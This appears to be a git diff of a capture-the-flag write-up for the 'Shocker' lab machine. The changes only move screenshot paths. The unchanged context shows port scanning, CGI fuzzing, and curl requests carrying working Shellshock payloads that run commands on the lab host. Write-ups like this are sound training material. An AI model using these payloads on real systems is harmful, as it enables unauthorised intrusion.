@@ -40,7 +40,7 @@ Check if the host is alive using ICMP:
 ping -c 1 10.129.10.164
 ```
 
-![ping](shocker_01_ping.png)
+![ping](screenshots/shocker_01_ping.png)
 
 ---
 ### 1.2 Port Scanning
@@ -59,7 +59,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.10.164 -oG allPorts
 - `-Pn` : Skip host discovery and treat host as up.  
 - `-oG` : Save grepable output.
 
-![allports](shocker_02_nmap_allports.png)
+![allports](screenshots/shocker_02_nmap_allports.png)
 
 Extract the open ports for reuse in targeted scans:
 
@@ -67,7 +67,7 @@ Extract the open ports for reuse in targeted scans:
 extractPorts allPorts
 ```
 
-![extractports](shocker_03_extractports.png)
+![extractports](screenshots/shocker_03_extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -83,7 +83,7 @@ cat targeted
 - `-sV` : Detect service versions.  
 - `-oN` : Save normal output for review.
 
-![targeted](shocker_04_nmap_targeted.png)
+![targeted](screenshots/shocker_04_nmap_targeted.png)
 
 **Findings:**
 
@@ -105,13 +105,13 @@ curl -i http://10.129.10.164
 ffuf -u http://10.129.10.164/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 404 -t 50
 ```
 
-![whatweb](shocker_05_whatweb.png)
-![curl-index](shocker_06_curl_index.png)
-![ffuf-root](shocker_07_ffuf_root.png)
+![whatweb](screenshots/shocker_05_whatweb.png)
+![curl-index](screenshots/shocker_06_curl_index.png)
+![ffuf-root](screenshots/shocker_07_ffuf_root.png)
 
 The landing page is static ("Don't Bug Me!"), as shown in the browser:
 
-![browser-homepage](shocker_08_browser_homepage.png)
+![browser-homepage](screenshots/shocker_08_browser_homepage.png)
 
 `ffuf` still reports `/cgi-bin/` with `403`, which is a useful pivot: the path exists but directory listing is denied.
 
@@ -120,7 +120,7 @@ The landing page is static ("Don't Bug Me!"), as shown in the browser:
 
 Opening `/cgi-bin/` in the browser returns `403 Forbidden`, which matches the fuzzer result:
 
-![cgi-bin-403](shocker_09_cgi_bin_403.png)
+![cgi-bin-403](screenshots/shocker_09_cgi_bin_403.png)
 
 Pivot to direct file fuzzing under `/cgi-bin/` with script extensions.
 
@@ -128,7 +128,7 @@ Pivot to direct file fuzzing under `/cgi-bin/` with script extensions.
 ffuf -u http://10.129.10.164/cgi-bin/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .sh,.cgi,.pl,.py -mc 200,301,302,403 -fs 296 -t 50
 ```
 
-![ffuf-cgibin](shocker_10_ffuf_cgibin_user_sh.png)
+![ffuf-cgibin](screenshots/shocker_10_ffuf_cgibin_user_sh.png)
 
 This reveals `/cgi-bin/user.sh` with `200 OK`, giving a concrete endpoint for exploitation tests.
 
@@ -143,11 +143,11 @@ Before launching a shell, validate the vulnerability path cleanly with the NSE s
 nmap --script http-shellshock --script-args uri=/cgi-bin/user.sh -p80 10.129.10.164
 ```
 
-![shellshock-nmap](shocker_11_nmap_shellshock_vuln.png)
+![shellshock-nmap](screenshots/shocker_11_nmap_shellshock_vuln.png)
 
 To capture traffic, run `tshark -w Capture.cap -i tun0` in one terminal, then generate HTTP from another (for example re-run the Nmap script or browse the site). This run stopped after 49 packets with `Capture.cap` on disk:
 
-![tshark-capture-setup](shocker_12_tshark_capture_setup.png)
+![tshark-capture-setup](screenshots/shocker_12_tshark_capture_setup.png)
 
 The PCAP corroborates the crafted headers and server behavior:
 
@@ -157,9 +157,9 @@ tshark -r Capture.cap -Y "http" -Tfields -e "tcp.payload" 2>/dev/null
 tshark -r Capture.cap -Y "http" -Tfields -e "tcp.payload" 2>/dev/null | xxd -ps -r; echo
 ```
 
-![tshark-summary](shocker_13_tshark_http_summary.png)
-![tshark-hex](shocker_14_tshark_payload_hex.png)
-![tshark-decoded](shocker_15_tshark_payload_decoded.png)
+![tshark-summary](screenshots/shocker_13_tshark_http_summary.png)
+![tshark-hex](screenshots/shocker_14_tshark_payload_hex.png)
+![tshark-decoded](screenshots/shocker_15_tshark_payload_decoded.png)
 
 Decoding `tcp.payload` shows the Shellshock payload reflected across `Referer`, `Cookie`, and `User-Agent`. For the next step, keep the payload in `User-Agent` and run explicit commands.
 
@@ -167,7 +167,7 @@ Decoding `tcp.payload` shows the Shellshock payload reflected across `Referer`, 
 curl -s -H 'User-Agent: () { :;}; echo; /bin/bash -c "whoami"' "http://10.129.10.164/cgi-bin/user.sh"
 curl -s -H 'User-Agent: () { :;}; echo; /bin/bash -c "id"' "http://10.129.10.164/cgi-bin/user.sh"
 ```
-![rce-proof](shocker_16_rce_id_whoami.png)
+![rce-proof](screenshots/shocker_16_rce_id_whoami.png)
 
 ---
 ### 3.2 Reverse Shell and User Proof
@@ -186,7 +186,7 @@ whoami
 cat /home/shelly/user.txt
 ```
 
-![reverse-shell-user](shocker_17_reverse_shell_user_flag.png)
+![reverse-shell-user](screenshots/shocker_17_reverse_shell_user_flag.png)
 
 ðŸ **User flag obtained**
 
@@ -201,7 +201,7 @@ With shell access established, the most direct privesc check is `sudo -l`.
 sudo -l
 ```
 
-![sudo-l](shocker_18_sudo_l.png)
+![sudo-l](screenshots/shocker_18_sudo_l.png)
 
 Output shows:
 - `(root) NOPASSWD: /usr/bin/perl`
@@ -219,7 +219,7 @@ whoami
 cat /root/root.txt
 ```
 
-![sudo-perl-root](shocker_19_sudo_perl_root_flag.png)
+![sudo-perl-root](screenshots/shocker_19_sudo_perl_root_flag.png)
 
 ðŸ **Root flag obtained**
 
